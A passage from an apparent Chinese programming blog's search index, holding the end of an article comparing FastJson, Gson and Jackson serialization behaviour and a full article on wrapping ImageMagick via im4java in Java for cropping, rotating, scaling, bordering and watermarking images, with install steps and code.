\"12\"} Jackson直接抛异常 1Null key for a Map not allowed in JSON (use a converting NullKeySerializer?) 说明 对于FastJson而言，若key不是String，那么输出为Json串时，key上不会有双引号，这种是不满足json规范的 gson则不管key是什么类型，都会转string jackson 若key为非string类型，非null，则会转String 推荐采用gson/jackson的使用姿势，key都转String，因此FastJson的姿势如下 1JSONObject.toJSONString(map,SerializerFeature.WriteNonStringKeyAsString) 对于key为null，jackson的兼容策略 1234567// key 为null，不抛异常，改用\"null\"objectMapper.getSerializerProvider().setNullKeySerializer(new JsonSerializer&lt;Object&gt;() { @Override public void serialize(Object value, JsonGenerator gen, SerializerProvider serializers) throws IOException { gen.writeFieldName(\"null\"); }}); 6. 类型不匹配String转其他基本类型（int/long/float/double/boolean），若满足Integer.valueOf(str)这种，则没有问题，否则抛异常 7. 未知属性当json串中有一个key，在定义的bean中不存在，表现形式也不一样 fastjson: 忽略这个key gson：忽略 jackson: 抛异常 一般来说，忽略是比较好的处理策略，jackson的配置如下 12// 反序列化时，找不到属性时，忽略字段objectMapper.disable(DeserializationFeature.FAIL_ON_UNKNOWN_PROPERTIES); 8. 循环引用对于循环引用序列化时，不同的框架处理策略也不一致 12345678@Datapublic class SelfRefBean implements Serializable { private static final long serialVersionUID = -2808787760792080759L; private String name; private SelfRefBean bean;} 输出json串如下 12345678// FastJson{&quot;bean&quot;:{&quot;$ref&quot;:&quot;@&quot;},&quot;name&quot;:&quot;yh&quot;}// Gson{&quot;name&quot;:&quot;yh&quot;}// Jackson 抛异常com.fasterxml.jackson.databind.exc.InvalidDefinitionException: Direct self-reference leading to cycle 除了上面这种自引用的case，更常见的是另外一种循环引用 12345678910111213141516171819@Data@Accessors(chain = true)public class SelfRefBean implements Serializable { private static final long serialVersionUID = -2808787760792080759L; private String name; private SelfRefBean2 bean;}@Data@Accessors(chain = true)public class SelfRefBean2 implements Serializable { private static final long serialVersionUID = -2808787760792080759L; private String name; private SelfRefBean bean;} 再次序列化，表现如下 12345678// FastJson{&quot;bean&quot;:{&quot;bean&quot;:{&quot;$ref&quot;:&quot;..&quot;},&quot;name&quot;:&quot;yhh&quot;},&quot;name&quot;:&quot;yh&quot;}// Gson 栈溢出Method threw &apos;java.lang.StackOverflowError&apos; exception.// Jackson 栈溢出com.fasterxml.jackson.databind.JsonMappingException: Infinite recursion (StackOverflowError) (through reference chain: 从安全性来看，FastJson的处理方式是比较合适的，针对Gson/Jackson，到没有比较简单的设置方式 一般来说，如果有循环引用的场景，请忽略这个字段的序列化，推荐添加 transient关键字 9. 驼峰与下划线java采用驼峰命名格式，php下划线的风格，他们两个之间的交互通常会面临这个问题 FastJson Gson Jackson 默认支持智能转换，也可以通过@JSONField @SerializedName @JsonProperty 虽然三种框架都提供了通过注解，来自定义输出json串的key的别名，但是更推荐使用全局的设置，来实现统一风格的转驼峰，转下划线 FastJson 驼峰转下换线 12345678910public static &lt;T&gt; String toUnderStr(T obj) { // 驼峰转下划线 SerializeConfig serializeConfig = new SerializeConfig(); // CamelCase 常见的驼峰格式 // PascalCase 单次首字母大写驼峰 // SnakeCase 下划线 // KebabCase 中划线 serializeConfig.setPropertyNamingStrategy(PropertyNamingStrategy.SnakeCase); return JSONObject.toJSONString(obj, serializeConfig, SerializerFeature.PrettyFormat, SerializerFeature.IgnoreNonFieldGetter);} Gson 实现驼峰与下换线互转 123456789101112131415public static &lt;T&gt; String toUnderStr(T obj) { GsonBuilder gsonBuilder = new GsonBuilder(); // 驼峰转下划线 gsonBuilder.setFieldNamingPolicy(FieldNamingPolicy.LOWER_CASE_WITH_UNDERSCORES); Gson gson = gsonBuilder.create(); return gson.toJson(obj);}public static &lt;T&gt; T fromUnderStr(String str, Class&lt;T&gt; clz) { GsonBuilder gsonBuilder = new GsonBuilder(); // 下划线的json串，反序列化为驼峰 gsonBuilder.setFieldNamingPolicy(FieldNamingPolicy.LOWER_CASE_WITH_UNDERSCORES); Gson gson = gsonBuilder.create(); return gson.fromJson(str, clz);} Jackson实现驼峰与下划线的转换 1234567891011121314151617181920212223242526272829303132333435/** * 驼峰转下换线 * * @param obj * @return */public static String toUnderStr(Object obj) { ObjectMapper objectMapper = new ObjectMapper(); // 驼峰转下划线 objectMapper.setPropertyNamingStrategy(PropertyNamingStrategies.SNAKE_CASE); // 忽略 transient 关键字修饰的字段 objectMapper.configure(MapperFeature.PROPAGATE_TRANSIENT_MARKER, true); // json串只包含非null的字段 objectMapper.setSerializationInclusion(JsonInclude.Include.NON_NULL); try { return objectMapper.writerWithDefaultPrettyPrinter().writeValueAsString(obj); } catch (JsonProcessingException e) { throw new UnsupportedOperationException(e); }}public static &lt;T&gt; T fromUnderStr(String str, Class&lt;T&gt; clz) { ObjectMapper objectMapper = new ObjectMapper(); // 忽略 transient 修饰的属性 objectMapper.configure(MapperFeature.PROPAGATE_TRANSIENT_MARKER, true); // 驼峰转下划线 objectMapper.setPropertyNamingStrategy(PropertyNamingStrategies.SNAKE_CASE); // 忽略找不到的字段 objectMapper.disable(DeserializationFeature.FAIL_ON_UNKNOWN_PROPERTIES); try { return objectMapper.readValue(str, clz); } catch (JsonProcessingException e) { throw new UnsupportedOperationException(e); }} 说明 对于Gson/Jackson而言，如果使用上面的驼峰转下划线的json串，那么反序列化的时候也需要使用对应的下划线转驼峰的方式 FastJson则默认开启驼峰与下划线的互转 10. JsonObject,JsonArray通常在java 生态中，更常见的是将Json串转为Java Bean，但某些场景也会希望直接获取JsonObject，JsonArray对象，当然是可以直接转为Map/List，使用前者的好处就是可以充分利用JsonElement的一些特性，如更安全的类型转换等 虽说三个框架的使用姿势不一样，但最终的表现差不多 FastJson 1234567public static JSONObject toObj(String str) { return JSONObject.parseObject(str);}public static JSONArray toAry(String str) { return JSONArray.parseArray(str);} Gson 1234567public static JsonObject toObj(String str) { return JsonParser.parseString(str).getAsJsonObject();}public static JsonArray toAry(String str) { return JsonParser.parseString(str).getAsJsonArray();} Jackson 1234567public static JsonNode toObj(String str) { try { return objectMapper.readTree(str); } catch (JsonProcessingException e) { throw new UnsupportedOperationException(e); }} 上面这些没啥好说的，但是，请一定注意，不要多个json工具混用，比如Gson反序列化为JsonObject，然后又使用Jackson进行序列化，可能导致各种鬼畜的问题 简单来说，就是不要尝试对JSONObject/JSONArray, JsonObject/JsonArray, JsonNode调用 jsonutil.encode 如果想输出json串，请直接调用 toString/toJSONString，千万不要搞事情 11. 泛型Json串，转泛型bean时，虽然各框架都有自己的TypeReference，但是底层的Type都是一致的 FastJson 1234567public static &lt;T&gt; T decode(String str, Type type) { return JSONObject.parseObject(str, type);}// 使用姿势FastjsonUtil.decode(str, new com.alibaba.fastjson.TypeReference&lt;GenericBean&lt;Map&gt;&gt;() { }.getType()); Gson 1234567public static &lt;T&gt; T decode(String str, Type type) { return gson.fromJson(str, type);}// 使用姿势GsonUtil.decode(str, new com.google.gson.reflect.TypeToken&lt;GenericBean&lt;Map&gt;&gt;() { }.getType()); Jackson 1234567891011public static &lt;T&gt; T decode(String str, Type type) { try { return objectMapper.readValue(str, objectMapper.getTypeFactory().constructType(type)); } catch (Exception e) { throw new UnsupportedOperationException(e); }}// 使用姿势JacksonUtil.decode(str, new com.fasterxml.jackson.core.type.TypeReference&lt;GenericBean&lt;Map&gt;&gt;() { }.getType()); III. 小结上面内容比较多，下面是提炼的干货 序列化 java bean 继承Serializable接口，持有serialVersionUID属性 每个需要序列化的，都需要有get/set方法 无参构造方法 忽略字段 不希望输出的属性，使用关键字transient修饰，注意jackson需要额外配置 循环引用 源头上避免出现这种场景，推荐直接在属性上添加 transient关键字 忽略value为null的属性 遵循原生的json规范 即不要用单引号替换双引号 key都要用双引号包裹 不要出现key为null的场景 反序列化 默认值 浮点型：转double，fastjson默认转为BigDecimal，需要额外处理 整数：转int/long gson 默认转为double，需要额外处理 对象: 转Map fastJson需要额外处理 数组: 转List fastJson转成了JSONArray，需要注意 未知属性，忽略 json串中有一个bean未定义的属性，建议直接忽略掉 jackson需要额外配置 泛型： 使用Type来精准的反序列化 驼峰与下划线的互转 建议规则统一，如果输出下划线，就所有的都是下划线风格；不要出现混搭 不建议使用注解的别名方式来处理，直接在工具层进行统一是更好的选择，不会出现因为json框架不一致，导致结果不同的场景 说明 实践策略 fastjson gson jackson Java Bean 实现Serializable接口 - - - Java Bean get/set方法，无参构造函数 - - - key为null 原则上不建议出现这种场景；如出现也不希望抛异常 - - objectMapper.getSerializerProvider().setNullKeySerializer 循环引用 源头上避免这种场景 本身兼容 抛异常 抛异常 key非String 输出Json串的key转String JSONObject.toJSONString(map,SerializerFeature.WriteNonStringKeyAsString) - - 忽略字段 transient 关键字 无需适配 无需适配 case1: objectMapper.configure(MapperFeature.PROPAGATE_TRANSIENT_MARKER, true); case2: objectMapper.setVisibility(objectMapper.getSerializationConfig().getDefaultVisibilityChecker().withFieldVisibility(JsonAutoDetect.Visibility.ANY).withGetterVisibility(JsonAutoDetect.Visibility.NONE).withIsGetterVisibility(JsonAutoDetect.Visibility.NONE)); 值为null 忽略 无需适配 无需适配 objectMapper.setSerializationInclusion(JsonInclude.Include.NON_NULL); 属性找不到 忽略 无需适配 无需适配 objectMapper.disable(DeserializationFeature.FAIL_ON_UNKNOWN_PROPERTIES); 反序列化默认值 浮点数转double JSONObject.parseObject(str, Map.class,JSON.DEFAULT_PARSER_FEATURE &amp; ~Feature.UseBigDecimal.getMask()) 无需适配 无需适配 反序列化默认值 整数转int/long 无需适配 自定义JsonDeserializer，见上文 无需适配 反序列化默认值 对象转map JSON.DEFAULT_PARSER_FEATURE 1 Feature.CustomMapDeserializer.getMask() 无需适配 无需适配 驼峰与下划线 统一处理 反序列化自动适配，序列化见上文 驼峰转下划线下划线转驼峰必须配套使用 驼峰转下划线下划线转驼峰必须配套使用 泛型 Type是最好的选择 new com.alibaba.fastjson.TypeReference&lt;GenericBean&gt;() {}.getType() new com.google.gson.reflect.TypeToken&lt;br /&gt;&lt;GenericBean&lt;Map&gt;&gt;() {}.getType() new com.fasterxml.jackson.core.type.TypeReference&lt;GenericBean&lt;Map&gt;&gt;() {}.getType() II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2021/07/15/210715-Json序列化框架对比与最佳实践推荐/"},{"title":"Java 借助ImageMagic实现图片编辑服务","text":"java原生对于图片的编辑处理并没有特别友好，而且问题也有不少，那么作为一个java后端，如果要提供图片的编辑服务可以怎么办？也得想办法去支持业务需求，本片博文基于此进行展开 I. 调研首先最容易想到的就是目前是不是已经有了相关的开源库，直接用不就很high了嘛，git上搜一下 1. thumbnailator差不多四年都没有更新了，基于awt进行图片的编辑处理，目前提供了基本的图片编辑接口，开始用了一段时间，有几个绕不够去的坑，所以最后放弃了 使用姿势： 12345&lt;dependency&gt; &lt;groupId&gt;net.coobird&lt;/groupId&gt; &lt;artifactId&gt;thumbnailator&lt;/artifactId&gt; &lt;version&gt;0.4.8&lt;/version&gt;&lt;/dependency&gt; 一个使用case: 123456BufferedImage originalImage = ImageIO.read(new File(\"original.jpg\"));BufferedImage thumbnail = Thumbnails.of(originalImage) .size(200, 200) .rotate(90) .asBufferedImage(); 问题说明： jpg图片编辑后，输出图片变红的问题（详情参考：兼容ImageIO读取jpeg图片变红） 图片精度丢失（对于精度要求较高的场景下，直接使用Jdk的BufferedImage会丢失精度） 上面两个问题中，第二个精度丢失在某些对图片质量有要求的场景下比较严重，如果业务场景没那么将就的话，用这个库还是可以减少很多事情的，下面基于ImageMagic的接口设计，很大程度上参考了该工程的使用规范，因为使用起来（+阅读）确实特别顺畅 2. simpleimage阿里的开源库，文档极其欠缺，而且良久没有人维护，没有实际使用过，感觉属于玩票的性质（个人猜测是KPI为导向下的产物） 如果想造轮子的话，参考它的源码，某些图片的处理方案还是不错的 3. imagemagic + im4javaImageMagic/GraphicMagic 是c++的图象处理软件，很多服务基于此来搭建图片处理服务的 优点：稳定、性能高、支持接口多、开箱即用、靠谱 缺点：得提前配置环境，基本上改造不动，内部有问题也没辙 这个方法也是下面的主要讲述重点，放弃Thumbnailator选择imagemagic的原因如下： 支持更多的服务功能（比Thumbnailator多很多的接口） 没有精度丢失问题 没有图片失真问题（颜色变化，alpha值变化问题） II. 环境准备首先得安装ImageMagic环境，有不少的第三方依赖，下面提供linux和mac的安装过程 1. linux安装过程123456789101112131415161718# 依赖安装yum install libjpeg-develyum install libpng-develyum install libwebp-devel## 也可以使用源码方式安装安装jpeg 包 `wget ftp://223.202.54.10/pub/web/php/libjpeg-6b.tar.gz`安装webp 包 `wget http://www.imagemagick.org/download/delegates/libwebp-0.5.1.tar.gz`安装png 包 `wget http://www.imagemagick.org/download/delegates/libpng-1.6.24.tar.gz`## 下载并安装ImageMagicwget http://www.imagemagick.org/download/ImageMagick.tar.gztar -zxvf ImageMagick.tar.gzcd ImageMagick-7.0.7-28./configure; sudo make; sudo make install 安装完毕之后，进行测试 1234567$ convert --versionVersion: ImageMagick 7.0.7-28 Q16 x86_64 2018-04-17 http://www.imagemagick.orgCopyright: © 1999-2018 ImageMagick Studio LLCLicense: http://www.imagemagick.org/script/license.phpFeatures: Cipher DPC HDRI OpenMPDelegates (built-in): fontconfig freetype jng jpeg lzma png webp x xml zlib 2. mac安装过程依赖安装 12345sudo brew install jpegsudo brew install libpngsudo brew install libwebpsudo brew install GraphicsMagicksudo brew install ImageMagick 源码安装方式与上面一致 3. 问题及修复如果安装完毕之后，可能会出现下面的问题 提示找不到png依赖: 安装：一直找不到 png的依赖，查阅需要安装 http://pkgconfig.freedesktop.org/releases/pkg-config-0.28.tar.gz 执行 convert 提示linux shared libraries 不包含某个库 临时方案：export LD_LIBRARY_PATH=/usr/local/lib:$LD_LIBRARY_PATH 永久方案： 123vi /etc/ld.so.conf在这个文件里加入：/usr/local/lib 来指明共享库的搜索位置然后再执行/sbin/ldconf 4. 常见Convert命令imagemagic的场景使用命令如下 裁图 convert test.jpg -crop 640x960+0+0 output.jpg 旋转 convert test.jpg -rotate 90 output.jpg 缩放 convert test.jpg -resize 200x200 output.jpg 强制宽高缩放 convert test.jpg -resize 200x200! output.jpg 缩略图 convert -thumbnail 200x300 test.jpg thumb.jpg 上下翻转： convert -flip foo.png bar.png 左右翻转： convert -flop foo.png bar.png 水印： composite -gravity northwest -dissolve 100 -geometry +0+0 water.png temp.jpg out.jpg 添加边框 : convert -border 6x6 -bordercolor “#ffffff” test.jpg bord.jpg 去除边框 : convert -thumbnail 200x300 test.jpg thumb.jpg III. 接口设计与实现java调用ImageMagic的方式有两种，一个是基于命令行的，一种是基于JNI的，我们选则im4java来操作imagemagic的接口（基于命令行的操作） 目标： 对外的使用姿势尽可能如 Thumbnailtor，采用builder模式来设置参数，支持多种输入输出 1. im4java使用姿势几个简单的case，演示下如何使用im4java实现图片的操作 1234567891011121314151617181920212223242526272829303132333435363738394041IMOperation op = new IMOperation();// 裁剪op.crop(operate.getWidth(), operate.getHeight(), operate.getX(), operate.getY());// 旋转op.rotate(rotate);// 压缩op.resize(operate.getWidth(), operate.getHeight());op.quality(operate.getQuality().doubleValue()); // 精度// 翻转op.flip();// 镜像op.flop();// 水印op.geometry(operate.getWidth(), operate.getHeight(), operate.getX(), operate.getY()).composite();// 边框op.border(operate.getWidth(), operate.getHeight()).bordercolor(operate.getColor());// 原始命令方式添加op.addRawArgs(\"-resize\", \"!100x200\");// 添加原始图片地址op.addImage(sourceFilename);// 目标图片地址op.addImage(outputFilename);/** 传true到构造函数中,则表示使用GraphicMagic, 裁图时,图片大小会变 */ConvertCmd convert = new ConvertCmd();convert.run(op); 2. 使用姿势在具体的设计接口之前，不妨先看一下最终的使用姿势，然后逆向的再看是如何设计的 123456789101112131415161718192021private static final String localFile = \"blogInfoV2.png\";/** * 复合操作 */@Testpublic void testOperate() { BufferedImage img; try { img = ImgWrapper.of(localFile) .board(10, 10, \"red\") .flip() .rotate(180) .crop(0, 0, 1200, 500) .asImg(); System.out.println(\"--- \" + img); } catch (Exception e) { e.printStackTrace(); }} 上面这个方法，演示了图片的多个操作，首先是加个红色边框，然后翻转，然后旋转180°，再裁剪输出图片 所以这个封装，肯定是使用了Builder模式了，接下来看下配置参数 3. 接口设计首先确定目前支持的几个方法：OperateType 其次就是相关的配置参数： Operate&lt;T&gt; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136@Datapublic static class Operate&lt;T&gt; { /** * 操作类型 */ private OperateType operateType; /** * 裁剪宽; 缩放宽 */ private Integer width; /** * 高 */ private Integer height; /** * 裁剪时,起始 x */ private Integer x; /** * 裁剪时,起始y */ private Integer y; /** * 旋转角度 */ private Double rotate; /** * 按照整体的缩放参数, 1 表示不变, 和裁剪一起使用 */ private Double radio; /** * 图片精度, 1 - 100 */ private Integer quality; /** * 颜色 (添加边框中的颜色; 去除图片中某颜色) */ private String color; /** * 水印图片, 可以为图片名, uri, 或者inputstream */ private T water; /** * 水印图片的类型 */ private String waterImgType; /** * 强制按照给定的参数进行压缩 */ private boolean forceScale; public boolean valid() { switch (operateType) { case CROP: return width != null &amp;&amp; height != null &amp;&amp; x != null &amp;&amp; y != null; case SCALE: return width != null || height != null || radio != null; case ROTATE: return rotate != null; case WATER: // 暂时不支持水印操作 return water != null; case BOARD: if (width == null) { width = 3; } if (height == null) { height = 3; } if (color == null) { color = \"#ffffff\"; } case FLIP: case FLOP: return true; default: return false; } } /** * 获取水印图片的路径 * * @return */ public String getWaterFilename() throws ImgOperateException { try { return FileWriteUtil.saveFile(water, waterImgType).getAbsFile(); } catch (Exception e) { e.printStackTrace(); return null; } }}public enum OperateType { /** * 裁剪 */ CROP, /** * 缩放 */ SCALE, /** * 旋转 */ ROTATE, /** * 水印 */ WATER, /** * 上下翻转 */ FLIP, /** * 水平翻转 */ FLOP, /** * 添加边框 */ BOARD;} 4. Builder实现简化使用成本，因此针对图片裁剪、旋转等接口，封装了更友好的接口方式 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314public static class Builder&lt;T&gt; { private T sourceFile; /** * 图片类型 JPEG, PNG, GIF ... * &lt;p&gt; * 默认为jpg图片 */ private String outputFormat = \"jpg\"; private List&lt;Operate&gt; operates = new ArrayList&lt;&gt;(); public Builder(T sourceFile) { this.sourceFile = sourceFile; } private static Builder&lt;String&gt; ofString(String str) { return new Builder&lt;String&gt;(ImgWrapper.class.getClassLoader().getResource(str).getFile()); } private static Builder&lt;URI&gt; ofUrl(URI url) { return new Builder&lt;URI&gt;(url); } private static Builder&lt;InputStream&gt; ofStream(InputStream stream) { return new Builder&lt;InputStream&gt;(stream); } /** * 设置输出的文件格式 * * @param format * @return */ public Builder&lt;T&gt; setOutputFormat(String format) { this.outputFormat = format; return this; } private void updateOutputFormat(String originType) { if (this.outputFormat != null || originType == null) { return; } int index = originType.lastIndexOf(\".\"); if (index &lt;= 0) { return; } this.outputFormat = originType.substring(index + 1); } /** * 缩放 * * @param width * @param height * @return */ public Builder&lt;T&gt; scale(Integer width, Integer height, Integer quality) { return scale(width, height, quality, false); } public Builder&lt;T&gt; scale(Integer width, Integer height, Integer quality, boolean forceScale) { Operate operate = new Operate(); operate.setOperateType(OperateType.SCALE); operate.setWidth(width); operate.setHeight(height); operate.setQuality(quality); operate.setForceScale(forceScale); operates.add(operate); return this; } /** * 按照比例进行缩放 * * @param radio 1.0 表示不缩放, 0.5 缩放为一半 * @return */ public Builder&lt;T&gt; scale(Double radio, Integer quality) { Operate operate = new Operate(); operate.setOperateType(OperateType.SCALE); operate.setRadio(radio); operate.setQuality(quality); operates.add(operate); return this; } /** * 裁剪 * * @param x * @param y * @param width * @param height * @return */ public Builder&lt;T&gt; crop(int x, int y, int width, int height) { Operate operate = new Operate(); operate.setOperateType(OperateType.CROP); operate.setWidth(width); operate.setHeight(height); operate.setX(x); operate.setY(y); operates.add(operate); return this; } /** * 旋转 * * @param rotate * @return */ public Builder&lt;T&gt; rotate(double rotate) { Operate operate = new Operate(); operate.setOperateType(OperateType.ROTATE); operate.setRotate(rotate); operates.add(operate); return this; } /** * 上下翻转 * * @return */ public Builder&lt;T&gt; flip() { Operate operate = new Operate(); operate.setOperateType(OperateType.FLIP); operates.add(operate); return this; } /** * 左右翻转,即镜像 * * @return */ public Builder&lt;T&gt; flop() { Operate operate = new Operate(); operate.setOperateType(OperateType.FLOP); operates.add(operate); return this; } /** * 添加边框 * * @param width 边框的宽 * @param height 边框的高 * @param color 边框的填充色 * @return */ public Builder&lt;T&gt; board(Integer width, Integer height, String color) { Operate args = new Operate(); args.setOperateType(OperateType.BOARD); args.setWidth(width); args.setHeight(height); args.setColor(color); operates.add(args); return this; } /** * 添加水印 * * @param water 水印的源图片 (默认为png格式) * @param x 添加到目标图片的x坐标 * @param y 添加到目标图片的y坐标 * @param &lt;U&gt; * @return */ public &lt;U&gt; Builder&lt;T&gt; water(U water, int x, int y) { return water(water, \"png\", x, y); } /** * 添加水印 * * @param water * @param imgType 水印图片的类型; 当传入的为inputStream时, 此参数才有意义 * @param x * @param y * @param &lt;U&gt; * @return */ public &lt;U&gt; Builder&lt;T&gt; water(U water, String imgType, int x, int y) { Operate&lt;U&gt; operate = new Operate&lt;&gt;(); operate.setOperateType(OperateType.WATER); operate.setX(x); operate.setY(y); operate.setWater(water); operate.setWaterImgType(imgType); operates.add(operate); return this; } /** * 执行图片处理, 并保存文件为: 源文件_out.jpg （类型由输出的图片类型决定） * * @return 保存的文件名 * @throws Exception */ public String toFile() throws Exception { return toFile(null); } /** * 执行图片处理,并将结果保存为指定文件名的file * * @param outputFilename 若为null, 则输出文件为 源文件_out.jpg 这种格式 * @return * @throws Exception */ public String toFile(String outputFilename) throws Exception { if (CollectionUtils.isEmpty(operates)) { throw new ImgOperateException(\"operates null!\"); } /** * 获取原始的图片信息， 并构建输出文件名 * 1. 远程图片，则保存到临时目录下 * 2. stream， 保存到临时目录下 * 3. 本地文件 * * 输出文件都放在临时文件夹内，和原文件同名，加一个_out进行区分 **/ FileWriteUtil.FileInfo sourceFile = createFile(); if (outputFilename == null) { outputFilename = FileWriteUtil.getTmpPath() + \"/\" + sourceFile.getFilename() + \"_\" + System.currentTimeMillis() + \"_out.\" + outputFormat; } /** 执行图片的操作 */ if (ImgBaseOperate.operate(operates, sourceFile.getAbsFile(), outputFilename)) { return outputFilename; } else { return null; } } /** * 执行图片操作,并输出字节流 * * @return * @throws Exception */ public InputStream asStream() throws Exception { if (CollectionUtils.isEmpty(operates)) { throw new ImgOperateException(\"operate null!\"); } String outputFilename = this.toFile(); if (StringUtils.isBlank(outputFilename)) { return null; } return new FileInputStream(new File(outputFilename)); } public byte[] asBytes() throws Exception { if (CollectionUtils.isEmpty(operates)) { throw new ImgOperateException(\"operate null!\"); } String outputFilename = this.toFile(); if (StringUtils.isBlank(outputFilename)) { return null; } return BytesTool.file2bytes(outputFilename); } public BufferedImage asImg() throws Exception { if (CollectionUtils.isEmpty(operates)) { throw new ImgOperateException(\"operate null!\"); } String outputFilename = this.toFile(); if (StringUtils.isBlank(outputFilename)) { return null; } return ImageIO.read(new File(outputFilename)); } private FileWriteUtil.FileInfo createFile() throws Exception { if (this.sourceFile instanceof String) { /** 生成的文件在源文件目录下 */ updateOutputFormat((String) this.sourceFile); } else if (this.sourceFile instanceof URI) { /** 源文件和生成的文件都保存在临时目录下 */ String urlPath = ((URI) this.sourceFile).getPath(); updateOutputFormat(urlPath); } return FileWriteUtil.saveFile(this.sourceFile, outputFormat); }} 参数的设置相关的比较清晰，唯一需要注意的是输出asFile()，这个里面实现了一些有意思的东西 保存原图片（将网络/二进制的原图，保存到本地） 生成临时输出文件 命令执行 上面前两个，主要是借助辅助工具 FileWriteUtil实现，与主题的关联不大，但是内部东西还是很有意思的，推荐查看： https://github.com/liuyueyi/quick-media/blob/master/plugins/base-plugin/src/main/java/com/github/hui/quick/plugin/base/FileWriteUtil.java 命令执行的封装如下(就是解析Operate参数，翻译成对应的IMOperation) 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394/** * 执行图片的复合操作 * * @param operates * @param sourceFilename 原始图片名 * @param outputFilename 生成图片名 * @return * @throws ImgOperateException */public static boolean operate(List&lt;ImgWrapper.Builder.Operate&gt; operates, String sourceFilename, String outputFilename) throws ImgOperateException { try { IMOperation op = new IMOperation(); boolean operateTag = false; String waterFilename = null; for (ImgWrapper.Builder.Operate operate : operates) { if (!operate.valid()) { continue; } if (operate.getOperateType() == ImgWrapper.Builder.OperateType.CROP) { op.crop(operate.getWidth(), operate.getHeight(), operate.getX(), operate.getY());// if (operate.getRadio() != null &amp;&amp; Math.abs(operate.getRadio() - 1.0) &gt; 0.005) {// // 需要对图片进行缩放// op.resize((int) Math.ceil(operate.getWidth() * operate.getRadio()));// } operateTag = true; } else if (operate.getOperateType() == ImgWrapper.Builder.OperateType.ROTATE) { // fixme 180度旋转后裁图,会出现bug, 先这么兼容 double rotate = operate.getRotate(); if (Math.abs((rotate % 360) - 180) &lt;= 0.005) { rotate += 0.01; } op.rotate(rotate); operateTag = true; } else if (operate.getOperateType() == ImgWrapper.Builder.OperateType.SCALE) { if (operate.getRadio() == null) { if (operate.isForceScale()) { // 强制根据给定的参数进行压缩时 StringBuilder builder = new StringBuilder(); builder.append(\"!\").append(operate.getWidth() == null ? \"\" : operate.getWidth()).append(\"x\"); builder.append(operate.getHeight() == null ? \"\" : operate.getHeight()); op.addRawArgs(\"-resize\", builder.toString()); } else { op.resize(operate.getWidth(), operate.getHeight()); } } else if(Math.abs(operate.getRadio() - 1) &gt; 0.005) { // 对图片进行比例缩放 op.addRawArgs(\"-resize\", \"%\" + (operate.getRadio() * 100)); } if (operate.getQuality() != null &amp;&amp; operate.getQuality() &gt; 0) { op.quality(operate.getQuality().doubleValue()); } operateTag = true; } else if (operate.getOperateType() == ImgWrapper.Builder.OperateType.FLIP) { op.flip(); operateTag = true; } else if (operate.getOperateType() == ImgWrapper.Builder.OperateType.FLOP) { op.flop(); operateTag = true; } else if (operate.getOperateType() == ImgWrapper.Builder.OperateType.WATER &amp;&amp; waterFilename == null) { // 当前只支持添加一次水印 op.geometry(operate.getWidth(), operate.getHeight(), operate.getX(), operate.getY()) .composite(); waterFilename = operate.getWaterFilename(); operateTag = true; } else if (operate.getOperateType() == ImgWrapper.Builder.OperateType.BOARD) { op.border(operate.getWidth(), operate.getHeight()).bordercolor(operate.getColor()); operateTag = true; } } if (!operateTag) { throw new ImgOperateException(\"operate illegal! operates: \" + operates); } op.addImage(sourceFilename); if (waterFilename != null) { op.addImage(waterFilename); } op.addImage(outputFilename); /** 传true到构造函数中,则表示使用GraphicMagic, 裁图时,图片大小会变 */ ConvertCmd convert = new ConvertCmd(); convert.run(op); } catch (IOException e) { log.error(\"file read error!, e: {}\", e); return false; } catch (InterruptedException e) { log.error(\"interrupt exception! e: {}\", e); return false; } catch (IM4JavaException e) { log.error(\"im4java exception! e: {}\", e); return false; } return true;} 5. 接口封装包装一个对外使用的方式 1234567891011121314151617181920212223242526272829303132public class ImgWrapper { /** * 根据本地图片进行处理 * * @param file * @return */ public static Builder&lt;String&gt; of(String file) { checkForNull(file, \"Cannot specify null for input file.\"); if (file.startsWith(\"http\")) { throw new IllegalArgumentException(\"file should not be URI resources! file: \" + file); } return Builder.ofString(file); } public static Builder&lt;URI&gt; of(URI uri) { checkForNull(uri, \"Cannot specify null for input uri.\"); return Builder.ofUrl(uri); } public static Builder&lt;InputStream&gt; of(InputStream inputStream) { checkForNull(inputStream, \"Cannot specify null for InputStream.\"); return Builder.ofStream(inputStream); } private static void checkForNull(Object o, String message) { if (o == null) { throw new NullPointerException(message); } }} IV. 测试上面基本上完成了整个接口的设计与实现，接下来就是接口测试了 给出几个使用姿势演示，更多可以查看：ImgWrapperTest 123456789101112131415161718192021222324252627282930313233343536373839404142private static final String url = \"http://a.hiphotos.baidu.com/image/pic/item/14ce36d3d539b6006a6cc5d0e550352ac65cb733.jpg\";private static final String localFile = \"blogInfoV2.png\";@Testpublic void testCutImg() { try { // 保存到本地 ImgWrapper.of(URI.create(url)) .crop(10, 20, 500, 500) .toFile(); } catch (Exception e) { e.printStackTrace(); }}@Testpublic void testRotateImg() { try { InputStream stream = FileReadUtil.getStreamByFileName(localFile); BufferedImage img = ImgWrapper.of(stream).rotate(90).asImg(); System.out.println(\"----\" + img); } catch (Exception e) { e.printStackTrace(); }}@Testpublic void testWater() { BufferedImage img; try { img = ImgWrapper.of(URI.create(url)) .board(10, 10, \"red\") .water(localFile, 100, 100) .asImg(); System.out.println(\"--- \" + img); } catch (Exception e) { e.printStackTrace(); }} V. 其他项目：GitHub: 项目：Quick-Media 源码：imagic-plugin Gitee: 项目：Quick-Media 源码：imagic-plugin 个人博客： 一灰灰Blog基于hexo + github 